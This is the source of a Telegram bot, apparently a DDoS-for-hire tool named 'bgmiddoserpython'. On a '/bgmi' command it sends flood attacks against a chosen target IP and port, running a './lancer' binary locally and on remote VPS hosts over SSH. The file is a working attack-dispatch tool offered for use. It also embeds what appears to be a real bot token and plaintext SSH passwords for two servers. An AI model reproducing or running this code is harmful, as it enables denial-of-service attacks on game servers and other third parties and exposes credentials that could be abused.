##bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import paramiko

bot = telebot.TeleBot('8013938312:AAH2wgu1Gsw29Lo5orDamDs3crFmJlHZYGE')  # Replace with your bot token
admin_id = {"6321758394"}  # Replace with your Telegram ID

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

vps_list = [
    {"type": "local"},
    {"type": "remote", "ip": "155.138.136.219", "username": "master_ngmatkuyvr", "password": "98Cf7KqktBBs"},
    {"type": "remote", "ip": "70.34.255.101", "username": "master_fptcarnpqt", "password": "jFtHtZf6swW4"}
]


vps_index = 0
bgmi_cooldown = {}
COOLDOWN_TIME = 3
user_offenses = {}
MAX_OFFENSES = 3

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def write_users():
    with open(USER_FILE, "w") as file:
        for uid in allowed_user_ids:
            file.write(f"{uid}\n")

allowed_user_ids = read_users()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def is_vps_online(ip):
    try:
        result = subprocess.run(["ping", "-c", "1", ip], stdout=subprocess.DEVNULL)
        return result.returncode == 0
    except:
        return False

def execute_remote_ssh(ip, username, password, command):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5)
        ssh.exec_command(command)
        ssh.close()
        return True
    except Exception as e:
        print(f"SSH error on {ip}: {e}")
        return False

def dispatch_attack(target, port, time):
    global vps_index
    total_vps = len(vps_list)
    command = f"./lancer {target} {port} {time}"
    for _ in range(total_vps):
        vps = vps_list[vps_index]
        if vps['type'] == 'local':
            subprocess.Popen(command, shell=True)
            break
        elif vps['type'] == 'remote':
            success = execute_remote_ssh(vps['ip'], vps['username'], vps['password'], command)
            if success:
                break
        vps_index = (vps_index + 1) % total_vps

@bot.message_handler(commands=['start'])
def start(message):
    name = message.from_user.first_name
    bot.reply_to(message, f"👋 Welcome {name}! Use /help to see available commands.")

@bot.message_handler(commands=['help'])
def help_command(message):
    bot.reply_to(message, '''🤖 Commands:
/start - Welcome message
/help - Show this help message
/add <id> - Add user (admin only)
/remove <id> - Remove user (admin only)
/allusers - List all users (admin only)
/logs - Show logs (admin only)
/clearlogs - Clear logs (admin only)
/vpsstatus - VPS online status (admin only)
/bgmi <target> <port> <time> - Launch attack
/mylogs - View your logs''')

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            new_user = cmd[1]
            if new_user not in allowed_user_ids:
                allowed_user_ids.append(new_user)
                write_users()
                bot.reply_to(message, f"User {new_user} added.")
            else:
                bot.reply_to(message, "User already exists.")
        else:
            bot.reply_to(message, "Usage: /add <user_id>")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            remove_id = cmd[1]
            if remove_id in allowed_user_ids:
                allowed_user_ids.remove(remove_id)
                write_users()
                bot.reply_to(message, f"User {remove_id} removed.")
            else:
                bot.reply_to(message, "User not found.")
        else:
            bot.reply_to(message, "Usage: /remove <user_id>")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['allusers'])
def all_users(message):
    if str(message.chat.id) in admin_id:
        users = "\n".join(allowed_user_ids) or "No users yet."
        bot.reply_to(message, f"Authorized users:\n{users}")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['logs'])
def logs(message):
    if str(message.chat.id) in admin_id:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "rb") as f:
                bot.send_document(message.chat.id, f)
        else:
            bot.reply_to(message, "No logs found.")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    if str(message.chat.id) in admin_id:
        open(LOG_FILE, 'w').close()
        bot.reply_to(message, "Logs cleared.")
    else:
        bot.reply_to(message, "ONLY OWNER CAN USE.")

@bot.message_handler(commands=['vpsstatus'])
def vps_status(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER CAN USE.")
        return

    result = "🔧 VPS Status Check (via SSH):\n"
    for i, vps in enumerate(vps_list):
        if vps['type'] == 'local':
            status = "🟢 Online (local)"
            ip = "127.0.0.1"
        else:
            ip = vps['ip']
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=5)
                ssh.close()
                status = "🟢 Online"
            except Exception as e:
                status = "🔴 Offline"
        result += f"VPS {i+1} ({ip}): {status}\n"

    bot.reply_to(message, result)

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids:
        bot.reply_to(message, "You are not authorized.")
        return
    cmd = message.text.split()
    if len(cmd) == 4:
        target, port, time = cmd[1], int(cmd[2]), int(cmd[3])
        if time > 300:
            bot.reply_to(message, "Time must be <= 300 seconds.")
            return
        record_command_logs(user_id, '/bgmi', target, port, time)
        log_command(user_id, target, port, time)
        dispatch_attack(target, port, time)
        bot.reply_to(message, f"Attack started: {target}:{port} for {time}s")
    else:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")

@bot.message_handler(commands=['mylogs'])
def mylogs(message):
    user_id = str(message.chat.id)
    try:
        with open(LOG_FILE, "r") as f:
            logs = f.readlines()
        user_logs = [log for log in logs if f"UserID: {user_id}" in log]
        response = "\n".join(user_logs) or "No logs found."
    except:
        response = "Log file missing."
    bot.reply_to(message, response)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        